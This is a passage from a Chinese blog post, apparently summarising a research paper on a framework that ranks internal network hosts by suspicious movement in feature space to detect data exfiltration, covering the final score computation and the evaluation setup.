style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.674115em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.674115em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∘</span></span></span></span></span></span></span></span></span></span></span></span>。因此所有的单位向量都有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ρ</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\rho=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ρ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，只剩下了两个变量。</p><p>下图展示了在特定的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>φ</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(\varphi,\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">φ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span>下，内部主机数量的直方图：</p><p><img src="https://img-blog.csdnimg.cn/2020022018180880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>显然，大多数内部主机仅沿可能方向的一小部分移动。 因此，朝着不太常见方向的运动代表着可疑行为。特别是，我们可以观察到两个具有相当高密度的空间区域。</p><p>为了更好地理解上述直方图，我们将其表示为2D投影图：</p><p><img src="https://img-blog.csdnimg.cn/20200220181813441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>接下来定义分数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>3</mn></msubsup></mrow><annotation encoding="application/x-tex">s_{t}^{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>3</mn></msubsup><mo>=</mo><mn>1</mn><mo>−</mo><mi mathvariant="normal">Pr</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mover accent="true"><mi mathvariant="bold">m</mi><mo>^</mo></mover><mi>t</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">s_{t}^{3}=1-\operatorname{Pr}\left(\hat{\mathbf{m}}_{t}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">P</span><span class="mord mathrm">r</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.70788em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span></span></span><span style="top:-3.01344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Pr</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mover accent="true"><mi mathvariant="bold">m</mi><mo>^</mo></mover><mi>t</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\operatorname{Pr}\left(\hat{\mathbf{m}}_{t}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">P</span><span class="mord mathrm">r</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.70788em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span></span></span><span style="top:-3.01344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>表示特征空间中特定方向的可能。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>−</mo><mi mathvariant="normal">Pr</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mover accent="true"><mi mathvariant="bold">m</mi><mo>^</mo></mover><mi>t</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">1-\operatorname{Pr}\left(\hat{\mathbf{m}}_{t}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">P</span><span class="mord mathrm">r</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.70788em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span></span></span><span style="top:-3.01344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>为其对立事件，称之为在特征空间中向某个方向移动的不可能性（unlikelihood）。因此该分数越高，主机的移动方向就越可疑。</p><h2 id="84-计算最终分数"><a class="markdownIt-Anchor" href="#84-计算最终分数"></a> 8.4 计算最终分数</h2><p>最终分数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">S_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是三个分数的线性组合：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>t</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mn>3</mn></msubsup><mrow><mo fence="true">(</mo><msubsup><mi>δ</mi><mi>t</mi><mi>j</mi></msubsup><mo>⋅</mo><msubsup><mi>s</mi><mi>t</mi><mi>j</mi></msubsup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">S_{t}=\sum_{j=1}^{3}\left(\delta_{t}^{j} \cdot s_{t}^{j}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.80002em;vertical-align:-0.65002em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.942572em;"><span style="top:-2.454244em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.1809080000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24575599999999995em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.942572em;"><span style="top:-2.454244em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.1809080000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24575599999999995em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span></p><p>其中$\delta_{t}^{j} <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">是</mi><mi mathvariant="normal">和</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">应</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">相</mi><mi mathvariant="normal">关</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">归</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">化</mi><mi mathvariant="normal">权</mi><mi mathvariant="normal">重</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">因</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">三</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">样</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">界</mi><mi mathvariant="normal">限</mi><mi mathvariant="normal">、</mi><mi mathvariant="normal">规</mi><mi mathvariant="normal">模</mi><mi mathvariant="normal">和</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">布</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">因</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">使</mi><mi mathvariant="normal">用</mi><mi>Q</mi><mi>W</mi><mi>M</mi><mi mathvariant="normal">定</mi><mi mathvariant="normal">义</mi></mrow><annotation encoding="application/x-tex">是和对应分数相关的归一化权重。因为三个分数有不一样的界限、规模和分布，因此我们使用QWM定义</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">应</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">归</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">权</span><span class="mord cjk_fallback">重</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">三</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">界</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">、</span><span class="mord cjk_fallback">规</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">布</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span></span></span></span>\delta_{t}^{j} $来将它们归一化：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>δ</mi><mi>t</mi><mi>j</mi></msubsup><mo>=</mo><mfrac><mrow><msub><mo>∑</mo><mrow><mi>k</mi><mo separator="true">,</mo><mi>k</mi><mi mathvariant="normal">≠</mi><mi>j</mi></mrow></msub><mi>Q</mi><mi>W</mi><mi>M</mi><mrow><mo fence="true">(</mo><msubsup><mi>s</mi><mi>t</mi><mi>k</mi></msubsup><mo fence="true">)</mo></mrow></mrow><mrow><msub><mo>∑</mo><mi>k</mi></msub><mi>Q</mi><mi>W</mi><mi>M</mi><mrow><mo fence="true">(</mo><msubsup><mi>s</mi><mi>t</mi><mi>k</mi></msubsup><mo fence="true">)</mo></mrow></mrow></mfrac><mo separator="true">,</mo><mi>k</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\delta_{t}^{j}=\frac{\sum_{k, k \neq j} Q W M\left(s_{t}^{k}\right)}{\sum_{k} Q W M\left(s_{t}^{k}\right)}, k \in\{1,2,3\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1883279999999998em;vertical-align:-0.24575599999999995em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.942572em;"><span style="top:-2.454244em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.1809080000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24575599999999995em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.139727em;vertical-align:-0.81em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.329727em;"><span style="top:-2.4924999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1745899999999999em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mathdefault mtight">Q</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span><span class="mord mathdefault mtight" style="margin-right:0.10903em;">M</span><span class="minner mtight"><span class="mopen sizing reset-size3 size6 mtight delimcenter" style="top:0.07500000000000001em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8408285714285715em;"><span style="top:-2.209457142857143em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29054285714285716em;"><span></span></span></span></span></span></span><span class="mclose sizing reset-size3 size6 mtight delimcenter" style="top:0.07500000000000001em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.632227em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1745899999999999em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight"><span class="mrel mtight"><span class="mord mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.69444em;"><span class="pstrut" style="height:2.69444em;"></span><span class="rlap mtight"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel mtight"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel mtight">=</span></span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.46032428571428574em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mathdefault mtight">Q</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span><span class="mord mathdefault mtight" style="margin-right:0.10903em;">M</span><span class="minner mtight"><span class="mopen sizing reset-size3 size6 mtight delimcenter" style="top:0.07500000000000001em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9270285714285713em;"><span style="top:-2.214em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mclose sizing reset-size3 size6 mtight delimcenter" style="top:0.07500000000000001em;"><span class="mtight">)</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.81em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">}</span></span></span></span></p><p>我们框架的最终输出是一个内部主机列表，该列表关于最终分数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">S_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>按降序排列。</p><h1 id="9-实验评估"><a class="markdownIt-Anchor" href="#9-实验评估"></a> 9 实验评估</h1><p>评估环境为一个具有10K台主机的网络，将本文的框架在其中运行了五个月。</p><p>评估的目的主要是下面三个方面：</p><ul><li>时间和存储空间方面的性能消耗</li><li>检测能力</li><li>对于不同类型主机、不同大小文件泄露的敏感度</li></ul><h2 id="91-实验测试平台和框架性能"><a class="markdownIt-Anchor" href="#91-实验测试平台和框架性能"></a> 9.1 实验测试平台和框架性能</h2><p>回顾之前在chapter 6中谈到的检测框架的五个步骤：流量收集和存储、特征提取、特征归一化、可疑分数计算和排名。每个步骤分别如下实现：</p><ul><li><strong>流量收集和存储</strong>由<a href="https://www.ntop.org/products/netflow/nprobe/" target="_blank" rel="noopener">nprobe</a>实现，它可以用来在大型网络环境中收集流量记录（flow records）。</li><li><strong>特征提取</strong>、<strong>特征归一化</strong>用Go语言实现</li><li><strong>可疑分数计算</strong>、<strong>排名</strong>用Python实现</li></ul><p>每隔时间T=1天进行一次采样，也就是说每天生成一次排名。时间窗口大小W=14天。</p><p>所收集到的流量记录如下所示：</p><p><img src="https://img-blog.csdnimg.cn/20200220181824379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>性能和内存需求：</p><p><img src="https://img-blog.csdnimg.cn/20200220181828611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="92-检测手工注入的数据窃取"><a class="markdownIt-Anchor" href="#92-检测手工注入的数据窃取"></a> 9.2 检测手工注入的数据窃取</h2><p>首先随机选择某一天，并且主机在这一天的数据上传量和平均水平相当。然后我们执行两个实验来模拟数据窃取，数据窃取量分别为40GB和9GB。</p><ul><li>知识点：<a href="https://www.statisticshowto.datasciencecentral.com/choose-bin-sizes-statistics/" target="_blank" rel="noopener"><strong>bin</strong> in statistics</a>；直方图中的类别</li></ul><p>经过计算，关于分数<span class="katex"><span 